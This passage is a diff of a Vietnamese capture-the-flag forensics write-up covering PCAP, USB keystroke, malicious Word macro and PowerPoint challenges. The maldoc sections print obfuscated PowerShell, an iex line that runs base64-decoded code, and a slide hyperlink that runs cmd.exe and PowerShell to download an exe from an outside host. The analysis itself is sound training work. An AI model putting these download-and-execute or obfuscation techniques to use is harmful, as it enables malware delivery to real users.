@@ -7,20 +7,20 @@
 
 ![image](https://user-images.githubusercontent.com/62060867/115961037-d7ae1e80-a53e-11eb-9d62-c489d5072d23.png)
 
-Challenge này cho mình một file ```PCAP```, đầu tiên hãy phân tích nps
+* Challenge này cho mình một file ```PCAP```, đầu tiên hãy phân tích nps
 
 ![image](https://user-images.githubusercontent.com/62060867/115961250-d9c4ad00-a53f-11eb-998e-b1101dad7035.png)
 
-Vậy chúng ta có TCP, DNS, ICMP. Sau khi xem sơ lược thì ICMP là trọng tâm cần chú ý đến, Filter ```icmp``` trên wireshark để lọc những thứ không cần thiết 
+* Vậy chúng ta có TCP, DNS, ICMP. Sau khi xem sơ lược thì ICMP là trọng tâm cần chú ý đến, Filter ```icmp``` trên wireshark để lọc những thứ không cần thiết 
 
 ![image](https://user-images.githubusercontent.com/62060867/115961355-4770d900-a540-11eb-82be-c6e246c3fb56.png)
 
-Tất cả các Protocol ICMP đều có length 100. Look at data, chúng ta có ```PK``` - file zip và chúng repeat 3 lần ```PK```
-Sử dụng ```tshark``` để lấy payloads, dùng filter để lấy các packet reply ```ip.dst == 192.168.1.8```
+* Tất cả các Protocol ICMP đều có length 100. Look at data, chúng ta có ```PK``` - file zip và chúng repeat 3 lần ```PK```
+* Sử dụng ```tshark``` để lấy payloads, dùng filter để lấy các packet reply ```ip.dst == 192.168.1.8```
 
 ```tshark -r older_trick.pcap -Y "ip.dst == 192.168.1.8" -T fields -e data.data > raw```
 
-Vậy chúng ta đã có được payload, nhưng vấn đề ở đây là làm sao để lấy file zip vì playload ở đây có tận 3 PK, vì vậy mình đã viết một đoạn python để lấy bytes từ vị trí 16 đến 48
+* Vậy chúng ta đã có được payload, nhưng vấn đề ở đây là làm sao để lấy file zip vì playload ở đây có tận 3 PK, vì vậy mình đã viết một đoạn python để lấy bytes từ vị trí 16 đến 48
 
 ![image](https://user-images.githubusercontent.com/62060867/115962768-12b45000-a547-11eb-983e-8ecd011b0824.png)
 
@@ -39,7 +39,8 @@ with open('flag.zip', 'wb') as out_file:
  ```
  ![image](https://user-images.githubusercontent.com/62060867/115963373-35476880-a549-11eb-90ef-ed738643e739.png)
 
- So we have a zip file, unzip it
+ *So we have a zip file, unzip it
+ 
  ```
  ┌──(kali㉿kali)-[~/Desktop/older]
 └─$ unzip flag.zip 
@@ -81,8 +82,8 @@ Archive:  flag.zip
   inflating: fini/webappsstore.sqlite-wal  
   inflating: fini/xulstore.json  
  ```
-We have: json, sqlite, cookies, db
-Đến đây là lúc nhờ đồng đội chơi Web Duytayto.
+* We have: json, sqlite, cookies, db
+* Đến đây là lúc nhờ đồng đội chơi Web Duytayto.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/older]
@@ -112,21 +113,21 @@ Decrypted: "CHTB{long_time_no_s33_icmp}"
 
 ![image](https://user-images.githubusercontent.com/62060867/115967032-8a3faa80-a55a-11eb-9e93-bc91371bdad1.png)
 
-Chall này tiếp tục cho ta một file pcap nhưng thuộc loại Protocol USB, sau khi phân tích và research mình đã định hướng được hướng làm
+* Chall này tiếp tục cho ta một file pcap nhưng thuộc loại Protocol USB, sau khi phân tích và research mình đã định hướng được hướng làm
 
 ![image](https://user-images.githubusercontent.com/62060867/115969171-db08d080-a565-11eb-8491-20c4b7a35439.png)
 
-Nhìn vào các packet có length 35 ta sẽ thấy `HID DATA` thay đổi, để thấy được rõ hơn mình add HID Data vào column
+* Nhìn vào các packet có length 35 ta sẽ thấy `HID DATA` thay đổi, để thấy được rõ hơn mình add HID Data vào column
 
 ![image](https://user-images.githubusercontent.com/62060867/115969244-39ce4a00-a566-11eb-9e9a-471da96a57ba.png)
 
-Bây giờ chúng ta extract tất cả giá trị này bằng cách ```Export Packet Dessections - As CSV```
+* Bây giờ chúng ta extract tất cả giá trị này bằng cách ```Export Packet Dessections - As CSV```
 
 ![image](https://user-images.githubusercontent.com/62060867/115969353-bc570980-a566-11eb-867c-1d2a0c539755.png)
 
 ![image](https://user-images.githubusercontent.com/62060867/115969377-d85aab00-a566-11eb-8ae3-00009be80d1f.png)
  
- Và dùng filter để lấy HID data vào một file
+* Và dùng filter để lấy HID data vào một file
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/key_mission]
@@ -151,8 +152,8 @@ Bây giờ chúng ta extract tất cả giá trị này bằng cách ```Export P
 .....
 .....
 ```
-Đây là một loại mã hóa USB keyboard.
-Sau đó mình tìm thấy được một đoạn code thích hợp cho việc decode các giá trị này 
+* Đây là một loại mã hóa USB keyboard.
+* Sau đó mình tìm thấy được một đoạn code thích hợp cho việc decode các giá trị này 
 
 ```
 !/usr/bin/python
@@ -260,15 +261,15 @@ Ispaceaamspacessendinfdeldelgspacessecrretary'sspaceloccationspaceoveerspacethis
 
 ```
 Oh you here `CHTB{a_place=3deldel-3deldel_3deldeldel3_fAr_fAar_awway_ffr0m_eearth}`. Tưởng mọi việc đã xong copy và submit 🥇 
-> Wrong flag tèn ten 
-Fake flag, oh no. Sau đó Duytayto đã nhìn ra được quy luật của strings này
+> * Wrong flag tèn ten 
+* Fake flag, oh no. Sau đó Duytayto đã nhìn ra được quy luật của strings này
 ```
 I aam -> I am
 ssendinfdeldelg -> sending
 deldel = backspace
 ```
-Đây mới chính là cái ta cần tìm `CHTB{a_plac3_fAr_fAr_away_fr0m_earth}`
-So we got the flag
+* Đây mới chính là cái ta cần tìm `CHTB{a_plac3_fAr_fAr_away_fr0m_earth}`
+> # So we got the flag: CHTB{a_plac3_fAr_fAr_away_fr0m_earth}
 
 # 3.Invitation
 
@@ -277,11 +278,11 @@ So we got the flag
 
 ![image](https://user-images.githubusercontent.com/62060867/115973389-d56bb480-a57e-11eb-80b4-12ccaa3cb803.png)
 
-Challenge này cho ta một file docx. Đây là một challenge phân tích tài liệu độc hại
-Thật chất đây là một file zip nên mình unzip và mục tiêu là tìm kiếm macro
+* Challenge này cho ta một file docx. Đây là một challenge phân tích tài liệu độc hại
+* Thật chất đây là một file zip nên mình unzip và mục tiêu là tìm kiếm macro
 
 ```
-                                                        ┌──(kali㉿kali)-[~/Desktop/Invitation]
+┌──(kali㉿kali)-[~/Desktop/Invitation]
 └─$ unzip invite.docm             
 Archive:  invite.docm
   inflating: [Content_Types].xml     
@@ -328,8 +329,9 @@ Archive:  invite.docm
 6 directories, 15 files
 
 ```
-Sau khi check tất cả các file thì mình nhận thấy file `vbaProject.bin` là nghi ngờ nhất
-Mình dùng [olevba](https://github.com/decalage2/oletools) để phân tích 
+* Sau khi check tất cả các file thì mình nhận thấy file `vbaProject.bin` là nghi ngờ nhất
+* Mình dùng [olevba](https://github.com/decalage2/oletools) để phân tích 
+
 ```
 ┌──(kali㉿kali)-[~/Desktop/Invitation/word]
 └─$ olevba vbaProject.bin | more              147 ⨯ 1 ⚙
@@ -388,7 +390,8 @@ odsuozldxufm("414649415251426841454d41534141744145384151
 
 ```
 
-Hmmm mình sẽ cố gắng giải mã các biểu thức VBA bằng deobfuscate và hiển thị mã nguồn macro sau khi thay thế tất cả các chuỗi bị xáo trộn bằng nội dung được giải mã của chúng
+*Hmmm mình sẽ cố gắng giải mã các biểu thức VBA bằng deobfuscate và hiển thị mã nguồn macro sau khi thay thế tất cả các chuỗi bị xáo trộn bằng nội dung được giải mã của chúng
+
 ```
 olevba --decode --deobf --reveal vbaProject.bin
 ```
@@ -495,7 +498,7 @@ End Function
 .....
 .....
 ```
-Chúng ta có thể thấy chúng được encode bằng base64. Decode ta được
+* Chúng ta có thể thấy chúng được encode bằng base64. Decode ta được
 
 ```
 . ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))  )
@@ -563,29 +566,31 @@ if ($installed) {
 iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadBase64)));
 ```
 
-Ok. Phân tích nào. Chúng ta có thể thấy chúng là đoạn lệnh powershell được mã hóa.
+* Ok. Phân tích nào. Chúng ta có thể thấy chúng là đoạn lệnh powershell được mã hóa.
+
 ```
 . ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))  )
 ```
-Nhìn đoạn lệnh này chúng ta có thể nhìn ra `CHTB{`
-Chạy thử trên Powershell
-Và `( $PshomE[4]+$pshoMe[30]+'x')` là một đoạn ngắn của Invoke-Expression 
+* Nhìn đoạn lệnh này chúng ta có thể nhìn ra `CHTB{`
+* Chạy thử trên Powershell
+* Và `( $PshomE[4]+$pshoMe[30]+'x')` là một đoạn ngắn của Invoke-Expression 
 
 ![image](https://user-images.githubusercontent.com/62060867/116120354-a58cf000-a6e9-11eb-9eb2-899890e519fa.png)
 
-Loại bỏ `( $PshomE[4]+$pshoMe[30]+'x')` 
+* Loại bỏ `( $PshomE[4]+$pshoMe[30]+'x')` 
+
 ![image](https://user-images.githubusercontent.com/62060867/116120809-2946dc80-a6ea-11eb-9015-6ba4355234eb.png)
 
 ```
 ('iqwreg'+'p ='+' jXtCH'+'T'+'B{'+'maldocs_arej'+'Xt;').REPLACe('iqw','$').REPLACe('jXt',[sTRInG][chAR]34) |&( $sheLLiD[1]+$sHeLlID[13]+'x')
 ```
 
-Chúng ta có tiếp một obfuscated IEX khác `( $sheLLiD[1]+$sHeLlID[13]+'x')`
-Loại bỏ nó ta có được một nửa flag 
+* Chúng ta có tiếp một obfuscated IEX khác `( $sheLLiD[1]+$sHeLlID[13]+'x')`
+* Loại bỏ nó ta có được một nửa flag 
 
 ![image](https://user-images.githubusercontent.com/62060867/116121307-ae31f600-a6ea-11eb-9db6-28310a468b61.png)
 
-Tiếp tục với
+* Tiếp tục với
 ```
 SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX 
 
@@ -601,11 +606,11 @@ SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]R
 
 ![image](https://user-images.githubusercontent.com/62060867/116123714-8c863e00-a6ed-11eb-9d0a-0fe1b3ea40d1.png)
 
-Tiếp tục với Phân tích tài liệu độc, lần này là một file PowerPoint
+* Tiếp tục với Phân tích tài liệu độc, lần này là một file PowerPoint
 
 ![image](https://user-images.githubusercontent.com/62060867/116124382-6c0ab380-a6ee-11eb-8401-b0c692f3119f.png)
 
-Như ta đã là, unzip file `pptx`
+* Như ta đã là, unzip file `pptx`
 ```
 ┌──(kali㉿kali)-[~/Desktop/HTB/AlienPhise]
 └─$ unzip Alien\ Weaknesses.pptx 
@@ -651,7 +656,7 @@ Archive:  Alien Weaknesses.pptx
   inflating: docProps/core.xml       
                                 
 ```
-Sau khi mình check tất cả các file thì nhận thấy file `slide1_xml.rels` chứa một chuỗi đáng ngờ
+* Sau khi mình check tất cả các file thì nhận thấy file `slide1_xml.rels` chứa một chuỗi đáng ngờ
 
 ```
 ┌──(kali㉿kali)-[~/…/AlienPhise/ppt/slides/_rels]
@@ -660,23 +665,29 @@ Sau khi mình check tất cả các file thì nhận thấy file `slide1_xml.rel
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe" TargetMode="External"/></Relationships>
 
 ```
-Nhìn vào các Target ta sẽ thấy ngay đoạn bất thường
+
+* Nhìn vào các Target ta sẽ thấy ngay đoạn bất thường
+
 ```
 Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22"
 ```
-Nếu để ý thì sẽ thấy một số string bị đảo ngược
+
+* Nếu để ý thì sẽ thấy một số string bị đảo ngược
+
 ```
 neila -> alien
 htraeyortsed -> destroyearth
 ptth -> http
 ```
-Reverse đoạn Target này lại
+* Reverse đoạn Target này lại
+
 ```
 
 22%52%=!XCk*:XCk52%02%llac02%002%qel02%X52%02%fi;pma&;pma&!1,X52%~:My!!XCk!=XCk02%tes02%od)0;1-;221(02%ni02%X52%02%L/02%rof;pma&;pma&powershell02%-c02%22%$o02%=02%$env:temp02%+02%'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe';02%iwr02%http:/destroyearth.alien/x.exe02%-outfile02%$o22%=My02%tes22%C/NO:V/02%exe.dmc"=tegraT
 ```
 
-Ta có một đoạn trông như base64 `Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM`
+* Ta có một đoạn trông như base64 `Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM`
+
 ```
 >>> import base64
 >>> flag = "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM="
@@ -684,7 +695,7 @@ Ta có một đoạn trông như base64 `Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM`
 b'CHTB{pH1sHiNg_w0_m4cr0s'
 
 ```
-> ## So we got the flag: CHTB{pH1sHiNg_w0_m4cr0s}
+> # So we got the flag: CHTB{pH1sHiNg_w0_m4cr0s}
 
 # 5.Low Energy Crypto	
 
@@ -692,8 +703,8 @@ b'CHTB{pH1sHiNg_w0_m4cr0s'
 
 ![image](https://user-images.githubusercontent.com/62060867/116129688-965f6f80-a6f4-11eb-8794-622ad1df2033.png)
 
-Tiếp tục với file `PCAPNG`. Lần đầu tiên gặp Protocol LE LL nên mình đã tìm tất cả các thông tin quan trọng. Ti
-Đầu tiên mình phát hiện được 2 phần Key Public ở Packet 215 và 223
+* Tiếp tục với file `PCAPNG`. Lần đầu tiên gặp Protocol LE LL nên mình đã tìm tất cả các thông tin quan trọng. 
+* Đầu tiên mình phát hiện được 2 phần Key Public ở Packet 215 và 223
 
 ![image](https://user-images.githubusercontent.com/62060867/116129688-965f6f80-a6f4-11eb-8794-622ad1df2033.png)
 
@@ -707,7 +718,7 @@ B9fjj4tlGekPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li
 -----END PUBLIC KEY-----
 ```
 
-Yep, tiếp tục ở Packet 230 mình tìm thấy được đoạn strings
+* Yep, tiếp tục ở Packet 230 mình tìm thấy được đoạn strings
 
 ![image](https://user-images.githubusercontent.com/62060867/116130934-fd315880-a6f5-11eb-98d3-b2c0b21c2002.png)
 
